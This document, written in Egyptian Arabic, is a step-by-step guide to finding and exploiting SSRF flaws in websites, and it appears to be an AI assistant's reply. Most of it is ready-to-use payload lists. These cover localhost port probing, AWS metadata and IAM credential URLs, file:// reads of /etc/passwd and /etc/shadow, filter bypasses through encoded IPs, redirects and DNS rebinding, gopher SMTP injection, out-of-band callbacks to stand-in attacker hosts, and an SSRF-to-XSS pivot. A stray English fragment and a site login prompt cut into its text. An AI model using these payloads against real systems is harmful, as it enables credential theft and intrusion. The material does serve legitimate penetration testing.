**خطوات اختبار ثغرة Server-Side Request Forgery (SSRF) في موقع ويب بالعربية مع ملخص الأوامر لكل خطوة**

أنا هشرح كل الجوانب اللي ذكرتها في النص عن SSRF بشكل منظم في خطوات واضحة وبسيطة، مع التأكد إني مغطي كل المواضيع (Common Exploitation Paths، Bypassing Filters، URL Schemes، Blind Exploitation، وUpgrade to XSS). كل خطوة هتكون متبوعة بملخص مرتب للأوامر أو المدخلات اللي ممكن تستخدمها. الخطوات هتكون عملية عشان لو بتختبر موقع، تعرف إزاي تطبقها.

**ملاحظة مهمة**: لازم يكون عندك إذن قانوني لاختبار الموقع، لأن الاختبار من غير إذن غير قانوني.

---

### **الخطوات**

#### **1. إيجاد نقطة الإدخال**
- **إيه اللي هتعمله؟** ابحث عن أي مكان في الموقع بياخد مدخلات منك (زي رابط URL أو عنوان IP) وممكن الخادم يستخدمه لإرسال طلبات HTTP.
- **إزاي تعملها؟**
  - افتح الموقع وابحث عن وظائف زي:
    - نماذج تطلب رابط (مثل حقل لجلب صورة، ملف، أو معاينة صفحة).
    - روابط URL تحتوي على معطيات (مثل `example.com/fetch?url=`).
    - أي وظيفة بتجيب محتوى من رابط خارجي.
  - جرب تدخل رابط عادي (مثل `http://example.com`) وشوف لو الموقع جاب محتوى الرابط أو أظهر ناتج مشابه.
  - لو الموقع استجاب، يبقى ممكن يكون عرضة لـ SSRF.
- **مثال**: لو الموقع عنده حقل لجلب رابط على `example.com/fetch?url=http://example.com`، جرب تدخل `http://example.com` وشوف لو الصفحة أظهرت محتواه.
- **ملخص الأوامر/المدخلات**:
  - `http://example.com` (رابط عادي لاختبار الوظيفة).
  - `https://google.com` (رابط خارجي للتأكد من جلب المحتوى).
  - `http://test.com` (رابط عشوائي لفهم سلوك الموقع).

---

#### **2. اختبار الوصول إلى الخدمات المحلية (Localhost وما يعادله)**
- **إيه اللي هتعمله؟** جرب إرسال طلبات إلى خدمات داخلية على الخادم نفسه (مثل `localhost` أو عناوين IP محلية) عشان تكتشف خدمات شغالة.
- **إزاي تعملها؟**
  - أدخل روابط تستهدف `localhost`، `127.0.0.1`، أو `0.0.0.0` على منافذ شائعة (مثل 80 للويب، 443 لـ HTTPS، 22 لـ SSH).
  - لو الموقع رد بناتج (مثل صفحة ويب، رسالة خطأ، أو ناتج خدمة)، يبقى فيه ثغرة SSRF.
  - جرب منافذ مختلفة عشان تعمل مسح للمنافذ (Port Scanning).
- **مثال**: جرب: `example.com/fetch?url=http://localhost:80`.
- **ملخص الأوامر/المدخلات**:
  - `http://localhost:80` (اختبار منفذ الويب).
  - `http://localhost:443` (اختبار HTTPS).
  - `http://localhost:22` (اختبار SSH).
  - `http://127.0.0.1:80` (اختبار بـ IP).
  - `http://127.0.0.1:443` (اختبار HTTPS بـ IP).
  - `http://127.0.0.1:22` (اختبار SSH بـ IP).
  - `http://0.0.0.0:80` (عنوان بديل للوكال هوست).
  - `http://0.0.0.0:443` (اختبار HTTPS).
  - `http://0.0.0.0:22` (اختبار SSH).

---


#### **3. اختبار الوصول إلى خدمات داخلية حساسة (مثل Cloud Metadata)**
- **إيه اللي هتعمله؟** جرب استهداف خدمات داخلية حساسة زي خدمات Metadata في بيئات السحابة (مثل AWS) أو قواعد بيانات داخلية.
- **إزاي تعملها؟**
  - أدخل رابط يستهدف خدمة حساسة زي AWS EC2 Metadata (`169.254.169.254`).
  - لو الموقع أظهر بيانات حساسة (مثل مفاتيح وصول، معلومات الخادم، أو بيانات IAM)، يبقى الثغرة خطيرة.
  - جرب خدمات أخرى زي Redis (`6379`)، Elasticsearch (`9200`)، أو قواعد بيانات داخلية.
- **مثال**: جرب: `example.com/fetch?url=http://169.254.169.254/latest/meta-data/`.
- **ملخص الأوام/المدخلات**:
  - `http://169.254.169.254/latest/meta-data/` (AWS EC2 Metadata).
  - `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (بيانات IAM في AWS).
  - `http://127.0.0.1:6379` (اختبار Redis).
  - `http://127.0.0.1:9200` (اختبار Elasticsearch).
  - `http://127.0.0.1:8080` (اختبار خدمات ويب داخلية مثل Jenkins).

---

#### **4. اختبار قراءة الملفات المحلية (File Scheme)**
- **إيه اللي هتعمله؟** جرب استخدام بروتوكول `file://` عشان تقرأ ملفات على الخادم، زي ملفات إعدادات أو ملفات حساسة.
- **إزاي تعملها؟**
  - أدخل رابط يستخدم `file://` للوصول إلى ملفات زي `/etc/passwd` أو `/etc/hosts`.
  - لو الموقع أظهر محتوى الملف أو أشار لخطأ يدل على محاولة قراءة، يبقى فيه ثغرة.
  - جرب ملفات أخرى زي سجلات الويب (`/var/log/apache2/access.log`) أوstrategies: 
    - Use tools like Burp Suite or OWASP ZAP to intercept and modify HTTP requests/responses.
    - Test different file paths like `/proc/self/environ` or `/etc/shadow` if `/etc/passwd` doesn’t work.
- **مثال**: جرب: `example.com/fetch?url=file:///etc/passwd`.
- **ملخص الأوامر/المدخلات**:
  - `file:///etc/passwd` (قراءة ملف المستخدمين).
  - `file://\/\/etc/passwd` (صيغة بديلة).
  - `file:///etc/hosts` (قراءة ملف الشبكة).
  - `file:///proc/self/environ` (قراءة متغيرات البيئة).
  - `file:///var/log/apache2/access.log` (قراءة سجل الويب).
  - `file:///etc/shadow` (محاولة قراءة ملف كلمات السر).

---

#### **5. اختبار تجاوز الفلاتر (Bypass Filters)**
- **إيه اللي هتعمله؟** لو الموقع بيمنع عناوين زي `localhost` أو `127.0.0.1`، جرب حيل عشان تتخطى الفلاتر باستخدام صيغ بديلة.
- **إزاي تعملها؟**
  - جرب صيغ مختلفة لعنوان `localhost` أو `127.0.0.1`:
    - **IPv6 Notation**:
      - استخدم `[::]` أو `[0000::1]` (عناوين IPv6 للوكال هوست).
      - استخدم `[::ffff:127.0.0.1]` (تضمين IPv4 في IPv6).
    - **CIDR Range**:
      - استخدم عناوين في نطاق `127.0.0.0/8` زي `127.0.0.2` أو `127.127.127.127`.
    - **Rare Addresses**:
      - استخدم صيغ مختصرة زي `127.1` أو `0`.
    - **Encoded IPs**:
      - حول IP لصيغة عشرية (مثل `2130706433` = `127.0.0.1`).
      - استخدم صيغة ثمانية (مثل `0177.0.0.1` = `127.0.0.1`).
    - **URL Encoding**:
      - جرب ترميز الحروف (مثل `%61` بدل `a` في `admin`).
    - **Enclosed Alphanumeric**:
      - استخدم حروف مشفرة زي `ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ` بدل `example.com`.
    - **Domain Redirects**:
      - استخدم نطاقات زي `127.0.0.1.nip.io` أو `localtest.me` اللي بتوجه لـ `127.0.0.1` أو `::1`.
  - لو أي حيلة نجحت، يبقى الفلاتر ضعيفة.
- **مثال**: جرب: `example.com/fetch?url=http://127.0.0.1.nip.io`.
- **ملخص الأوامر/المدخلات**:
  - `http://[::]:80/` (IPv6 unspecified address).
  - `http://[0000::1]:80/` (IPv6 loopback).
  - `http://[::ffff:127.0.0.1]:80/` (IPv6/IPv4 embedding).
  - `http://127.0.0.2:80` (CIDR range).
  - `http://127.127.127.127:80` (CIDR range).
  - `http://127.1:80` (عنوان مختصر).
  - `http://0:80/` (عنوان مختصر).
  - `http://2130706433/` (عشري لـ `127.0.0.1`).
  - `http://2852039166/` (عشري لـ `169.254.169.254`).
  - `http://0177.0.0.1/` (ثماني لـ `127.0.0.1`).
  - `http://o177.0.0.1/` (ثماني بديل).
  - `http://127.0.0.1/%61dmin` (ترميز URL).
  - `http://127.0.0.1/%2561dmin` (ترميز URL مزدوج).
  - `http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ` (حروف مشفرة).
  - `http://127.0.0.1.nip.io` (نطاق يوجه إلى `127.0.0.1`).
  - `http://localtest.me` (نطاق يوجه إلى `::1`).
  - `http://localh.st` (نطاق يوجه إلى `127.0.0.1`).
  - `http://spoofed.redacted.oastify.com` (نطاق يوجه إلى `127.0.0.1`).

---

#### **6. اختبار التجاوز باستخدام إعادة التوجيه (Redirects)**
- **إيه اللي هتعمله؟** جرب استخدام روابط تُعاد توجيهها إلى أهداف داخلية (مثل `localhost`) عشان تتخطى فلاتر تمنع الوصول المباشر.
- **إزاي تعملها؟**
  - أنشئ صفحة على خادم خارجي موثوق (أو استخدم خدمة زي `r3dir.me`) تعيد التوجيه إلى عنوان داخلي.
  - أدخل رابط إعادة التوجيه في حقل SSRF.
  - لو الموقع نفذ الطلب وأظهر ناتج من العنوان الداخلي، يبقى نجح []سجل الدخول لتتمكن من عرض هذا المحتوى.لتتمكن من عرض هذا المحتوى، يرجى تسجيل الدخول. <a href="/register/">تسجيل الدخول</a>
  - استخدم رموز إعادة توجيه HTTP 307 أو 308 عشان تحتفظ بطريقة الطلب والبيانات.
- **مثال**: جرب: `example.com/fetch?url=https://307.r3dir.me/--to/?url=http://localhost`.
- **ملخص الأوامر/المدخلات**:
  - `https://307.r3dir.me/--to/?url=http://localhost` (إعادة توجيه 307 إلى `localhost`).
  - `https://307.r3dir.me/--to/?url=http://127.0.0.1:80` (إعادة توجيه إلى `127.0.0.1`).
  - `https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me` (إعادة توجيه 302 إلى AWS Metadata).
  - `http://your-redirect.com/?to=http://169.254.169.254/latest/meta-data/` (رابط إعادة توجيه مخصص).

---

#### **7. اختبار التجاوز باستخدام DNS Rebinding**
- **إيه اللي هتعمله؟** استخدم نطاق يتغير بين عنوان خارجي وعنوان داخلي (مثل `127.0.0.1` أو `169.254.169.254`) عشان تتخطى الفلاتر.
- **إزاي تعملها؟**
  - استخدم خدمة زي `1u.ms` لإنشاء نطاق يتبدل بين عنوانين.
  - أدخل النطاق في حقل SSRF.
  - استخدم `nslookup` عشان تتأكد إن النطاق بيتغير بين العناوين.
  - لو الموقع أظهر بيانات من العنوان الداخلي، يبقى نجحت.
- **مثال**: جرب: `example.com/fetch?url=http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms`.
- **ملخص الأوامر/المدخلات**:
  - `http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms` (يتبدل بين عنوان خارجي وAWS Metadata).
  - `http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms` (يتبدل إلى `127.0.0.1`).
  - `http://make-1.2.3.4-rebind-192.168.0.1-rr.1u.ms` (يتبدل إلى `192.168.0.1`).

---

#### **8. اختبار التجاوز باستخدام اختلاف تحليل URL (URL Parsing Discrepancy)**
- **إيه اللي هتعمله؟** استغل الاختلافات في طريقة تحليل الروابط بين مكتبات البرمجة المختلفة (مثل `urllib`، `requests`) عشان تتخطى الفلاتر.
- **إزاي تعملها؟**
  - جرب روابط تحتوي على رموز غريبة (مثل `\@` أو `#`) عشان تخدع المحلل.
  - لو الموقع وصل لعنوان غير متوقع (مثل `127.2.2.2` بدل `127.1.1.1`)، يبقى نجحت.
- **مثال**: جرب: `example.com/fetch?url=http://127.1.1.1:80\@127.2.2.2:80/`.
- **ملخص الأوامر/المدخلات**:
  - `http://127.1.1.1:80\@127.2.2.2:80/` (تحليل خاطئ باستخدام `\@`).
  - `http://127.1.1.1:80\@@127.2.2.2:80/` (استخدام `@@`).
  - `http://127.1.1.1:80:\@@127.2.2.2:80/` (استخدام `:\@@`).
  - `http://127.1.1.1:80#\@127.2.2.2:80/` (استخدام `#\@`).
  - `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` (اختبار مكتبات مختلفة).

---

#### **9. اختبار التجاوز باستخدام دالة PHP filter_var()**
- **إيه اللي هتعمله؟** لو الموقع بيستخدم PHP `filter_var()` للتحقق من الروابط، جرب روابط غريبة يقبلها (خاصة في PHP 7.0.25).
- **إزاي تعملها؟**
  - أدخل روابط تحتوي على أحرف غير متوقعة زي `???` أو صيغ غير قياسية زي `0://`.
  - لو الموقع قبل الرابط ونفذ الطلب، يبقى نجحت.
- **مثال**: جرب: `example.com/fetch?url=http://test???test.com`.
- **ملخص الأوامر/المدخلات**:
  - `http://test???test.com` (رابط غريب يقبله `filter_var()`).
  - `0://evil.com:80;http://google.com:80/` (صيغة مختلطة).
  - `0://127.0.0.1:80/` (استهداف `localhost` بصيغة `0://`).

---

#### **10. اختبار التجاوز باستخدام JAR Scheme**
- **إيه اللي هتعمله؟** جرب استخدام بروتوكول `jar:` لإرسال طلبات عمياء (Blind) إلى أهداف داخلية.
- **إزاي تعملها؟**
  - أدخل رابط يستخدم `jar:` لاستهداف `localhost` أو خدمات داخلية.
  - ملاحظة: دي تقنية عمياء، يعني ما هتشوفش الناتج مباشرة، بس ممكن تستخدم أداة زي Interactsh لتسجيل التفاعل.
- **مثال**: جرب: `example.com/fetch?url=jar:http://127.0.0.1!/`.
- **ملخص الأوامر/المدخلات**:
  - `jar:http://127.0.0.1!/` (استهداف `localhost`).
  - `jar:https://127.0.0.1!/` (استهداف HTTPS).
  - `jar:ftp://127.0.0.1!/` (استهداف FTP).
  - `jar:http://169.254.169.254!/latest/meta-data/` (استهداف AWS Metadata).

---

#### **11. اختبار استغلال بروتوكولات أخرى (URL Schemes)**
- **إيه اللي هتعمله؟** جرب بروتوكولات غير HTTP (زي `gopher://`، `dict://`، `ldap://`) عشان تتفاعل مع خدمات غير الويب.
- **إزاي تعملها؟**
  - أدخل روابط تستخدم بروتوكولات زي:
    - `gopher://` لإرسال بيانات إلى TCP (مثل SMTP).
    - `dict://` لخدمات DICT.
    - `ldap://` لخدمات LDAP.
    - `sftp://` لنقل ملفات.
    - `tftp://` لنقل عبر UDP.
    - `netdoc://` لقراءة ملفات في Java.
  - لو الموقع نفذ الطلب أو أظهر ناتج غريب، يبقى البروتوكول مدعوم.
- **مثال**: جرب: `example.com/fetch?url=gopher://localhost:25/_TEST`.
- **ملخص الأوامر/المدخلات**:
  - `gopher://localhost:25/_TEST` (اختبار SMTP).
  - `gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A` (إرسال بريد عبر SMTP).
  - `dict://attacker:11111/` (اختبار DICT).
  - `sftp://evil.com:11111/` (اختبار SFTP).
  - `tftp://evil.com:12346/TESTUDPPACKET` (اختبار TFTP).
  - `ldap://localhost:11211/%0astats%0aquit` (اختبار LDAP).
  - `netdoc:///etc/passwd` (قراءة ملف عبر Java).


![Pasted image 20250422211424.png|595](attachments/Pasted image 20250422211424.png|595)

----

#### **12. اختبار الاستغلال العمياء (Blind Exploitation)**
- **إيه اللي هتعمله؟** لو ما قدرتش تشوف ناتج الطلبات، جرب إرسال طلبات إلى خدمات خارجية تلتقط التفاعل (Out-of-Band).
- **إزاي تعملها؟**
  - استخدم أداة زي `app.interactsh.com` لإنشاء نطاق أو خادم يلتقط الطلبات.
  - أدخل رابط يحتوي على النطاق في حقل SSRF.
  - جرب استهداف خدمات داخلية زي:
    - Elasticsearch (`127.0.0.1:9200`).
    - Redis (`127.0.0.1:6379`).
    - Jenkins (`127.0.0.1:8080`).
    - أو خدمات أخرى (مثل Weblogic، Apache Solr، Docker).
  - لو شفت تفاعل في الأداة (مثل طلب HTTP أو DNS)، يبقى الثغرة موجودة.
- **مثال**: جرب: `example.com/fetch?url=http://your-id.interact.sh`.
- **ملخص الأوامر/المدخلات**:
  - `http://your-id.interact.sh` (نطاق Interactsh لتسجيل التفاعل).
  - `http://127.0.0.1:6379?data=your-id.interact.sh` (اختبار Redis).
  - `http://127.0.0.1:9200?query=your-id.interact.sh` (اختبار Elasticsearch).
  - `http://127.0.0.1:8080?test=your-id.interact.sh` (اختبار Jenkins).
  - `gopher://127.0.0.1:6379/_PING%0D%0Ayour-id.interact.sh` (اختبار Redis عبر Gopher).
  - `gopher://127.0.0.1:11211/_stats%0D%0Ayour-id.interact.sh` (اختبار Memcache عبر Gopher).

---

#### **13. محاولة تحويل SSRF إلى XSS**
- **إيه اللي هتعمله؟** لو الثغرة مش خطيرة (مثلًا ما تقدرش توصل لخدمات داخلية أو تسرّب ملفات)، جرب تحويلها إلى XSS عشان تزود التأثير.
- **إزاي تعملها؟**
  - أدخل رابط لملف SVG يحتوي على JavaScript (مثل ملف على خادمك أو ملف جاهز).
  - لو الموقع نفذ الـ JavaScript أو أظهر الملف كجزء من الصفحة، يبقى نجحت.
- **مثال**: جرب: `example.com/fetch?url=http://brutelogic.com.br/poc.svg`.
- **ملخص الأوامر/المدخلات**:
  - `http://brutelogic.com.br/poc.svg` (ملف SVG جاهز يحتوي على JavaScript).
  - `http://your-server.com/poc.svg` (ملف SVG مخصص على خادمك).
  - `http://your-server.com/xss.js` (ملف JavaScript مخصص).

---

### **نصايح عامة**
- **سجل كل شيء**: اكتب كل مدخل جربته والنتايج عشان تحللها بعدين.
- **كن حذر**: لازم يكون عندك إذن قانوني للاختبار.
- **ابدأ بسيط**: جرب روابط زي `http://localhost:80` قبل ما تجرب حيل معقدة زي DNS Rebinding.
- **راقب التفاعل**: لو ما ظهرش ناتج، استخدم أدوات زي Interactsh لتسجيل الطلبات.
- **جرب كل الحيل**: لو فلتر منع رابط، جرب صيغ بديلة (IPv6، ترميز، إلخ) واحدة واحدة.
- **استخدم أدوات**: أدوات زي Burp Suite أو OWASP ZAP بتساعدك تعترض وتعدل الطلبات.

---

### **مثال كامل**
افترض إنك بتختبر موقع فيه حقل لجلب رابط على `example.com/fetch?url=`.
1. جرب: `example.com/fetch?url=http://example.com` (اختبار عادي).
2. جرب: `example.com/fetch?url=http://localhost:80` (اختبار localhost).
3. جرب: `example.com/fetch?url=http://169.254.169.254/latest/meta-data/` (اختبار Metadata).
4. جرب: `example.com/fetch?url=file:///etc/passwd` (قراءة ملف).
5. لو فيه فلتر، جرب: `example.com/fetch?url=http://127.0.0.1.nip.io` أو `example.com/fetch?url=http://2130706433/`.
6. جرب إعادة توجيه: `example.com/fetch?url=https://307.r3dir.me/--to/?url=http://localhost`.
7. جرب DNS Rebinding: `example.com/fetch?url=http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms`.
8. جرب اختلاف تحليل URL: `example.com/fetch?url=http://127.1.1.1:80\@127.2.2.2:80/`.
9. جرب PHP `filter_var()`: `example.com/fetch?url=http://test???test.com`.
10. جرب JAR: `example.com/fetch?url=jar:http://127.0.0.1!/`.
11. جرب بروتوكولات: `example.com/fetch?url=gopher://localhost:25/_TEST`.
12. جرب استغلال عمياء: `example.com/fetch?url=http://your-id.interact.sh`.
13. جرب XSS: `example.com/fetch?url=http://brutelogic.com.br/poc.svg`.

---

الشرح ده غطّى كل المواضيع اللي في النص (Common Exploitation Paths، Bypassing Filters، URL Schemes، Blind Exploitation، وUpgrade to XSS) بشكل مفصل وعملي. لو عايز تفاصيل أكتر عن أي خطوة أو أمثلة إضافية، قولي وأنا أشرح!